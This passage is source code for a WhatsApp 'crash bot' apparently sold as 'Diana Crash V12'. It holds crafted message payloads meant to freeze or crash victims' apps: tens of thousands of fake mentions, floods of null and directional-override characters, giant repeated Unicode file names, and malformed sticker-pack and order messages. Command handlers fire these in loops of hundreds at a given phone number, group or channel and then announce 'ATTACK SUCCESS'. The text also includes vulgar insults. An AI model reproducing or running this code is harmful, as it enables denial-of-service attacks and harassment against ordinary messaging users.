              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "\u0000",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '༑Kontol⍣᳟Bapakkaupecah꙳⟅🩸' + Hytam + Legam,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Hades Document Killer",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await asep.relayMessage(target, message, { participant: { jid: target } });
}

async function ProtoXAudio(target, mention) {
    console.log("Attack DelayProto Berjalann...")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "CikssXyz Is Heree Baybyy" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function bugZip(target, kuwoted) {
  const payloadZipName = `AsepNotDev${`superUltra`.xp}`;

  const document = proto.Message.fromObject({
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
      mimetype: " image/webp", // ZIP file type
      fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
      fileLength: "999999999",
      pageCount: 999999999999,
      mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
      fileName: "I killed you." + "𑲯".repeat(55000) + "ྫྷ".repeat(55000) +`ឿ`.repeat(3905) + payloadZipName,
      fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
      directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1715880173"
    }
  });

  const msg = generateWAMessageFromContent(target, document, {
    userJid: target,
    quoted: kuwoted
  });

  await asep.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  console.log(`[BUG-ZIP] Sent to ${target}`);
}

async function Forclose(target) {
  const repeatChar = (char, length) => Array(length).fill(char).join('');

  const nulls = repeatChar('\u0000', 160000); // Maks null-char
  const zwnj = repeatChar('\u200C', 10000);
  const rtl = repeatChar('\u202E', 500);
  const override = repeatChar('\u2060', 10000);
  const fff9 = repeatChar('\uFFF9', 10000);
  const Section = repeatChar('\uFFF9', 10000);

  const bigJson = JSON.stringify({
    title: rtl + zwnj,
    description: nulls,
    sections: Array.from({ length: 200 }, (_, i) => ({
      title: Section,
      rows: Array.from({ length: 5 }, (__, j) => ({
        title: fff9 + j,
        description: zwnj + j,
        rowId: j
      }))
    }))
  });

  const payload = {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          contentText: nulls,
          footerText: zwnj + fff9,
          headerType: 1,
          buttons: [
            {
              buttonText: {
                displayText: rtl + "⚠️ Jangan Dibuka!"
              }
            }
          ],
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: bigJson
              },
              {
                name: "call_permission_request",
                buttonParamsJson: bigJson
              },
              {
                name: "mpm",
                buttonParamsJson: bigJson
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [target]
          }
        }
      }
    }
  };

  await asep.relayMessage(target, payload, {});
}

async function FreezePackk(target) {
    await asep.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "Asep - StickerPack" + "ꦾ".repeat(70000),
      publisher: "Bug Grup Zamm" + "",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 25000 }, () =>
                  `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
                        }
                    }, {});
                  }
                  
async function VampCrashCH(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target }); // Perbaiki dari target ke target

  await asep.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
                  
async function order(isTarget) {
const msg = generateWAMessageFromContent(isTarget, {
interactiveMessage: {
nativeFlowMessage: {
buttons: [{
name: "review_order",
buttonParamsJson: {
reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
order: {
status: "completed",
order_type: "ORDER" },
share_payment_status: true }}],
messageParamsJson: {}}}
}, { userJid: isTarget });
await asep.relayMessage(isTarget, msg.message, { 
messageId: msg.key.id })}            
                  
                  async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await asep.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
//======================
switch (command) {
//case bug
case "rizxuii": {
    if (!isPremium) return m.reply('Lu Siapa Kocakk');
    if (!text) return m.reply(`\`Example:\` : ${prefix + command} 628×××`);   
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"; 
    // Kirim foto setelah konfirmasi
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Ganti dengan URL gambar yang valid atau path lokal
        caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });
    //Eksekusi Target

    // Kirim serangan bug
    for (let i = 0; i < 870; i++) {
        await carouselNew(target);
        await bulldozer(target);
        await carouselNew(target);
        await bulldozer(target);
        await DelayStc(target);
        await DelayStc(target);
        await carouselNew(target);
        await bulldozer(target);
        await carouselNew(target);
        await bulldozer(target);
        await DelayStc(target);
        await DelayStc(target);
        await SockMentionJid3(target, false);
        await SockMentionJid3(target, false);
        await SockMentionJid3(target, false);
        await BaccaratUi(target);
        await BaccaratUi(target);
        await BaccaratUi(target);
        await CosmoBlankX(target);
        await CosmoBlankX(target);
        await CosmoBlankX(target);
        await CosmoBlankX(target);
    }

    break;
}
//======================
case "rizdelayhard": {
    
if (!isPremium) return m.reply('Lu Siapa Kocakk');
    if (!text) return m.reply(`\`Example:\` : ${prefix + command} 628×××`);   
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"; 
    // Kirim foto setelah konfirmasi
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Ganti dengan URL gambar yang valid atau path lokal
        caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });
    //Eksekusi Target
          for (let i = 0; i < 879; i++) {
            await protocolbug2(target, true)
            await protocolbug1(target, true) 
            await protocolbug2(target, true)
            await protocolbug3(target, true)
            await protocolbug4(target, true)
            await VampPaymentCrash(target, true)
            await protocolbug5v2(target, true)
            await protocolbug5v2(target, true)
            await protocolbug5v2(target, false)
            await protocolbug5v2(target, false)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await VampDelayMess(target)
            await VampPrivateBlank(target)
            await VampDelayCrash(target)
            await VampBroadcast(target, true)
            await mentionSw(target)
            await carouselNew(target)
        }
    }
  
break;
//======================
case "buldozer": {
if (!isPremium) return m.reply('Lu Siapa Kocakk');
    if (!text) return m.reply(`\`Example:\` : ${prefix + command} 628×××`);   
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"; 
    // Kirim foto setelah konfirmasi
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Ganti dengan URL gambar yang valid atau path lokal
        caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });
    //Eksekusi Target
          for (let i = 0; i < 879; i++) {
            await bulldozer(target);
            await bulldozer(target);
            await bulldozer(target);
            await bulldozer(target);
        }
    }
  
break;
//======================
case "fcxriz": {
    if (!isPremium) return m.reply('Lu Siapa Kocakk');
    if (!text) return m.reply(`\`Example:\` : ${prefix + command} 628×××`);   
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"; 
    // Kirim foto setelah konfirmasi
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Ganti dengan URL gambar yang valid atau path lokal
        caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });

    // Eksekusi spam bug
    for (let i = 0; i < 500; i++) {
        await combo3(target);
        await combo2(target);
    }

    break;
}
//=======================
case "blankxui": {
if (!isPremium) return m.reply('Lu Siapa Kocakk');
    if (!text) return m.reply(`\`Example:\` : ${prefix + command} 628×××`);   
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"; 
    // Kirim foto setelah konfirmasi
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Ganti dengan URL gambar yang valid atau path lokal
        caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });
    //Eksekusi Target
          for (let i = 0; i < 879; i++) {
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
        }

    }
  
break;

case "rizcombo": {
if (!isPremium) return m.reply('Anda siapah?');
    if (!text) return m.reply(`\`Example:\` : ${prefix + command} 628×××`);   
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"; 
    // Kirim foto setelah konfirmasi
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Ganti dengan URL gambar yang valid atau path lokal
        caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });
    //Eksekusi Target
          for (let i = 0; i < 879; i++) {
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bugZip(target)
            await bugZip(target)
            await bugZip(target)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await combo3(target)
            await combo2(target)
        }

    }
  
break;
case 'blankgroup':
case 'delaygroup':
case 'rizzcrashgb':
case 'frezehard': {
    if (!isPremium) return m.reply('Anda siapa?.');

    if (!text) return m.reply(`\`Example:\` ${prefix + command} https://chat.whatsapp.com/XXXXXX`);

    // Ambil kode undangan grup dari link
    let inviteCode = text.split("https://chat.whatsapp.com/")[1];
    if (!inviteCode) return m.reply("Link grup tidak valid!");

    // Join ke grup
    let target = await asep.groupAcceptInvite(inviteCode);

    // Kirim gambar sebagai efek dramatis
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Gambar bebas diganti
        caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });

    // Eksekusi spam bug
    for (let i = 0; i < 240; i++) {
        await FreezePackk(target);
        await FreezePackk(target);
        await FreezePackk(target);
        await FreezePackk(target);
    }
}
    break;
case 'forclosech':
case 'crashch':
case 'brutalch':
case 'xjids': {
    if (!isPremium) return m.reply('Lu siapa kocakk? Premium dulu sana.');
    if (!q) return m.reply(`\`Example:\` ${prefix + command} 120363xxxxxxx`)

    if (!/^\d{15,}$/.test(q)) return m.reply("❌ Gunakan hanya ID channel yang valid (120363xxxxxxx)");

    let target = `${q}@newsletter`;
    
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Gambar bebas diganti
    caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });
    ////////// Sending Bugs //////////
    for (let i = 0; i < 500; i++) {
        await VampCrashCH(target);
        await order(target);
        await CrashJids(target);
    }
    ////////// Succes Bugs //////////
}
break;
case 'anjay': {
    if (!isPremium) return m.reply('premium only');

    if (!text) return m.reply(`\`Example:\` ${prefix + command} https://chat.whatsapp.com/XXXXXX`);

    // Ambil kode undangan grup dari link
    let inviteCode = text.split("https://chat.whatsapp.com/")[1];
    if (!inviteCode) return m.reply("Link grup tidak valid!");

    // Join ke grup
    let target = await asep.groupAcceptInvite(inviteCode);

    // Kirim gambar sebagai efek dramatis
    await asep.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/7074/620073261_imgtmp.jpg' }, // Gambar bebas diganti
        caption: `╭━≫☠︎︎𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒☠︎︎≪━╮
│ ❀ *Target* : ${target}
│ ❀ *Virus* : ${command}
│ ✿ *Script* : *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑*
┗━━━━━━━━━━━━━━━━━〣`
    }, { quoted: lol });

    // Eksekusi spam bug
    for (let i = 0; i < 240; i++) {
        await FreezePackk(m.chat);
        await FreezePackk(m.chat);
        await FreezePackk(m.chat);
        await FreezePackk(m.chat);
    }
}
    break;
//======================
case 'public': { 
if (!isCreator) return m.reply(mess.owner) 
if (asep.public === true) return m.reply("Successfully changed to public mode🎀");
asep.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (asep.public === false) return m.reply("successfully changed to self mode🌠");
asep.public = false
m.reply(mess.succes)
}
break
//======================
const namaOrang = m.pushName || "No Name"
const info = `${namaOrang}`;
//=======================
case "menu":
case "help":
case "diana": {
await asep.sendMessage(m.chat, { react: { text: "👑",key: m.key,}}); 
  const itsmenu = `
\` ｢ *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑* ｣ \`
*नमस्ते👋* \`${pushname}\`
*मैं DIANA CRASH V12☠️ हूँ। मैं सिस्टम को क्रैश करने आई हूँ 💀। मेरा डेवलपर Diana👩‍💻 है।*

╔═══｢ \`QUEEN ~ DIANA\` ｣
║ Script : 𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑
║ Developer : https://ẉ.ceo/Diana
║ Version : V.11
║ Status : \`Buy Vip Only\`
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⪼
╔═════════════╗
*\`press the button\`*
╚═════════════╝
*LINK SC* : https://whatsapp.com/channel/0029VbAxlQKHFxOvBw4stl3s
`;

  const buttons = [
    { buttonId: '.bugmenu', buttonText: { displayText: 'Menu bugs🪽' }, type: 1 },
    { buttonId: '.ownermenu', buttonText: { displayText: 'Owner menu🪐' }, type: 1 },
    { buttonId: '.funmenu', buttonText: { displayText: 'Fun menu🌌' }, type: 1 }
  ];

  // Kirim pesan menu bergambar + tombol
  await asep.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/tdb80x.jpg' },
    caption: itsmenu,
    footer: '𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑',
    buttons: buttons,
    headerType: 4
  }, { quoted: lol });

  // Kirim audio sebagai voice note (PTT = true)
  await asep.sendMessage(m.chat, {
    audio: { url: './image/menu.mp3' }, // ganti path dengan lokasi file kamu
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: qpayment });
}
break;
case "bugmenu": {
await asep.sendMessage(m.chat, { react: { text: "🧿",key: m.key,}}); 
  const itsmenu = `
*नमस्ते* \`${pushname}\`
*मैं DIANA CRASH V12☠️ हूँ। मैं सिस्टम को क्रैश करने आई हूँ 💀। मेरा डेवलपर Diana👩‍💻 है।*

╔════⪨ \`Bug Menu\` ⪩════╗
║𖥞 ⧼ FcXriz ⧽
┃𖤛 ⧼ RizDelayHard ⧽
║𖥞 ⧼ RizXui ⧽
┃𖤛 ⧼ Buldozer ⧽
┃𖥞 ⧼ BlankXui ⧽
┃𖤛 ⧼ RizCombo ⧽
╚═════════════════╝
╔═════════════╗
*\`press the button\`*
╚═════════════╝

*LINK SC * : https://whatsapp.com/channel/0029VbAx6A44inoy09TyHr21`;

  const buttons = [
    { buttonId: '.buggrup', buttonText: { displayText: 'Byg Group🕷️' }, type: 1 },
    { buttonId: '.funmenu', buttonText: { displayText: 'Fun menu🍻' }, type: 1 }, 
    { buttonId: '.owner', buttonText: { displayText: 'My Owner🕊️' }, type: 1 }
  ];

  await asep.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/ntuhhm.jpg' },
    caption: itsmenu,
    footer: '𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑',
    buttons: buttons,
    headerType: 4
  }, { quoted: lol });

  // Kirim audio sebagai voice note (PTT = true)
  await asep.sendMessage(m.chat, {
    audio: { url: './image/menu.mp3' }, // ganti path dengan lokasi file kamu
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: qpayment });
}
break;
case "buggrup": {
await asep.sendMessage(m.chat, { react: { text: "🦠",key: m.key,}}); 
  const itsmenu = `
*選択してください* \`${pushname}\`
*私のバグボットです*
*ここからメニューを選択してください*

╔════⪨ \`Bug Group\` ⪩════╗
║𖥞 ⧼ RizCrashgb ⧽
┃𖤛 ⧼ FrezeHard ⧽
║𖥞 ⧼ DelayGroup ⧽
┃𖤛 ⧼ BlankGroup ⧽
┃𖥞 ⧼ anjay ⧽ <langsung di grub>
╚═════════════════╝

